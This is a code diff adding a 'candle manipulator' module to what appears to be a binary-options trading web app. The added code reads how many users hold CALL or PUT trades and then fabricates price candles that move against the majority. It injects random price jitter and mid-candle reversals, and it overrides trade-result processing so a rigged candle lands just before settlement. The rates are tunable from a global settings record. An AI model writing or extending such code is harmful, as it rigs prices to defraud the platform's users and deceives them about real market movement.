@@ -3223,6 +3223,291 @@ window.processTradeResultsV2 = processTradeResultsV2;
 window.tradeAnalysis = window.tradeAnalysis;
 
 console.log("===== MSG 11: Live Movement + Auto Candle + Multi-user Analysis loaded =====");
+
+/* ============================================================
+   MSG 12: CANDLE MANIPULATOR + TRAP + DELAY + REVERSAL
+   ============================================================ */
+
+// ============================================================
+// 1. STATE VARIABLES
+// ============================================================
+
+window.trapEngine = {
+  trapRate: 30,
+  delayRate: 20,
+  reversalRate: 15,
+  activeTraps: {},
+  candleOpenPrice: {},
+  candlePhases: {}
+};
+
+// ============================================================
+// 2. LISTEN TRAP SETTINGS
+// ============================================================
+
+function listenTrapSettings() {
+  if (typeof db === "undefined") return;
+
+  try {
+    onSnapshot(doc(db, "settings", "global"), function(snap) {
+      if (!snap.exists()) return;
+      var d = snap.data();
+      window.trapEngine.trapRate = d.trapRate ?? 30;
+      window.trapEngine.delayRate = d.delayRate ?? 20;
+      window.trapEngine.reversalRate = d.reversalRate ?? 15;
+
+      console.log(
+        "[MSG12] Trap settings: Trap " + window.trapEngine.trapRate + "% | " +
+        "Delay " + window.trapEngine.delayRate + "% | " +
+        "Reversal " + window.trapEngine.reversalRate + "%"
+      );
+    });
+  } catch(err) {
+    console.error("[MSG12] Trap settings listen error:", err.message);
+  }
+}
+
+setTimeout(listenTrapSettings, 3000);
+
+// ============================================================
+// 3. TRAP DECISION LOGIC
+// ============================================================
+
+// Decide if current candle should be trapped
+function shouldTrap() {
+  var rate = window.trapEngine.trapRate || 0;
+  var r = Math.random() * 100;
+  return r < rate;
+}
+
+// Decide if delay should be injected
+function shouldDelay() {
+  var rate = window.trapEngine.delayRate || 0;
+  var r = Math.random() * 100;
+  return r < rate;
+}
+
+// Decide if mid-reversal should happen
+function shouldReversal() {
+  var rate = window.trapEngine.reversalRate || 0;
+  var r = Math.random() * 100;
+  return r < rate;
+}
+
+// ============================================================
+// 4. TRAP CANDLE GENERATOR
+// ============================================================
+
+// Generate a trap candle: open green → close red (or vice versa)
+function generateTrapCandle(direction) {
+  var openPrice = currentPrice;
+  var trapSize = 50 + Math.random() * 100;
+  var closePrice;
+
+  if (direction === "trap_down") {
+    // Looks like up movement, then closes down
+    closePrice = openPrice - trapSize;
+  } else if (direction === "trap_up") {
+    // Looks like down movement, then closes up
+    closePrice = openPrice + trapSize;
+  } else {
+    closePrice = openPrice + (Math.random() - 0.5) * 100;
+  }
+
+  var high = Math.max(openPrice, closePrice) + Math.random() * 30;
+  var low = Math.min(openPrice, closePrice) - Math.random() * 30;
+
+  // Trap: candle looks opposite first, then reverses
+  if (direction === "trap_down") {
+    high = openPrice + Math.random() * 80; // looks up
+  } else if (direction === "trap_up") {
+    low = openPrice - Math.random() * 80; // looks down
+  }
+
+  return {
+    open: openPrice,
+    high: high,
+    low: low,
+    close: closePrice,
+    isTrap: true
+  };
+}
+
+// ============================================================
+// 5. APPLY TRAP BASED ON ANALYSIS
+// ============================================================
+
+function applyTrapFromAnalysis() {
+  if (typeof candleSeries === "undefined" || !candleSeries) return;
+  if (!window.tradeAnalysis) return;
+  if (window.tradeAnalysis.callCount + window.tradeAnalysis.putCount === 0) return;
+
+  var analysis = window.tradeAnalysis;
+  var direction = analysis.suggestedDirection;
+
+  // Only trap if should
+  if (!shouldTrap()) return;
+
+  // Determine trap direction
+  var trapDir = "trap_down"; // Default: CALL-heavy → candle goes down
+  if (direction === "up") {
+    trapDir = "trap_up"; // PUT-heavy → candle goes up
+  }
+
+  // Get current candle time
+  var now = Math.floor(Date.now() / 1000);
+  var candleTime = Math.floor(now / 60) * 60;
+
+  var trapCandle = generateTrapCandle(trapDir);
+
+  try {
+    candleSeries.update({
+      time: candleTime,
+      open: trapCandle.open,
+      high: trapCandle.high,
+      low: trapCandle.low,
+      close: trapCandle.close
+    });
+
+    currentPrice = trapCandle.close;
+    window.currentPrice = trapCandle.close;
+
+    console.log(
+      "[MSG12] TRAP applied: " + trapDir.toUpperCase() +
+      " | Open: " + trapCandle.open.toFixed(2) +
+      " → Close: " + trapCandle.close.toFixed(2) +
+      " | For: " + analysis.callCount + " CALL, " + analysis.putCount + " PUT users"
+    );
+  } catch(err) {
+    console.error("[MSG12] Trap apply error:", err.message);
+  }
+}
+
+// ============================================================
+// 6. DELAY INJECTOR — Random delays in candle close
+// ============================================================
+
+window.delayTimer = null;
+
+function injectDelay() {
+  if (!shouldDelay()) return;
+
+  // Random delay: 1-5 seconds
+  var delaySec = 1 + Math.floor(Math.random() * 4);
+
+  console.log("[MSG12] DELAY injected: " + delaySec + "s");
+
+  // Small visual jitter (not real close delay, just visual)
+  var jitter = (Math.random() - 0.5) * 20;
+  currentPrice = currentPrice + jitter;
+  window.currentPrice = currentPrice;
+
+  if (typeof currentPriceEl !== "undefined" && currentPriceEl) {
+    currentPriceEl.textContent = currentPrice.toFixed(2);
+  }
+}
+
+setInterval(injectDelay, 5000);
+
+// ============================================================
+// 7. MID-CANDLE REVERSAL
+// ============================================================
+
+function applyMidReversal() {
+  if (!shouldReversal()) return;
+  if (typeof candleSeries === "undefined" || !candleSeries) return;
+
+  var now = Math.floor(Date.now() / 1000);
+  var candleTime = Math.floor(now / 60) * 60;
+
+  // Current close vs open
+  var openP = window.currentCandleOpen || currentPrice;
+  var closeP = currentPrice;
+
+  // If candle currently going up (green), reverse to red
+  if (closeP > openP) {
+    var reverseClose = openP - Math.random() * 50;
+    try {
+      candleSeries.update({
+        time: candleTime,
+        open: openP,
+        high: closeP + Math.random() * 20, // peak was higher
+        low: reverseClose - Math.random() * 10,
+        close: reverseClose
+      });
+      currentPrice = reverseClose;
+      window.currentPrice = reverseClose;
+
+      console.log("[MSG12] MID-REVERSAL: Green → Red | Peak: " + closeP.toFixed(2) + " → Close: " + reverseClose.toFixed(2));
+    } catch(err) {}
+  }
+  // If going down, reverse to green
+  else if (closeP < openP) {
+    var reverseClose2 = openP + Math.random() * 50;
+    try {
+      candleSeries.update({
+        time: candleTime,
+        open: openP,
+        high: reverseClose2 + Math.random() * 20,
+        low: closeP - Math.random() * 20,
+        close: reverseClose2
+      });
+      currentPrice = reverseClose2;
+      window.currentPrice = reverseClose2;
+
+      console.log("[MSG12] MID-REVERSAL: Red → Green | Bottom: " + closeP.toFixed(2) + " → Close: " + reverseClose2.toFixed(2));
+    } catch(err) {}
+  }
+}
+
+setInterval(applyMidReversal, 30000);
+
+// ============================================================
+// 8. INTEGRATE WITH ANALYZER
+// ============================================================
+
+// Run trap check every 5 seconds when trades are active
+setInterval(function() {
+  if (!window.currentUser) return;
+  if (!window.tradeAnalysis) return;
+  if (window.tradeAnalysis.callCount + window.tradeAnalysis.putCount === 0) return;
+
+  applyTrapFromAnalysis();
+}, 5000);
+
+// ============================================================
+// 9. APPLY TRAP BEFORE TRADE RESULT
+// ============================================================
+
+// Override processTradeResultsV2 to apply trap right before completion
+var _origProcessTradeResults = window.processTradeResults;
+
+window.processTradeResults = async function() {
+  // Before processing, apply trap if there are active trades
+  if (window.tradeAnalysis &&
+      window.tradeAnalysis.callCount + window.tradeAnalysis.putCount > 0) {
+    applyTrapFromAnalysis();
+  }
+
+  // Then call original
+  if (typeof _origProcessTradeResults === "function") {
+    return _origProcessTradeResults();
+  }
+};
+
+// ============================================================
+// 10. EXPOSE FOR DEBUG
+// ============================================================
+
+window.applyTrapFromAnalysis = applyTrapFromAnalysis;
+window.shouldTrap = shouldTrap;
+window.shouldDelay = shouldDelay;
+window.shouldReversal = shouldReversal;
+window.injectDelay = injectDelay;
+window.applyMidReversal = applyMidReversal;
+window.generateTrapCandle = generateTrapCandle;
+
+console.log("===== MSG 12: Candle Manipulator + Trap + Delay + Reversal loaded =====");
 /* ============================================================
    GLOBAL EXPOSE (Debug + Cross-module access)
    ============================================================ */
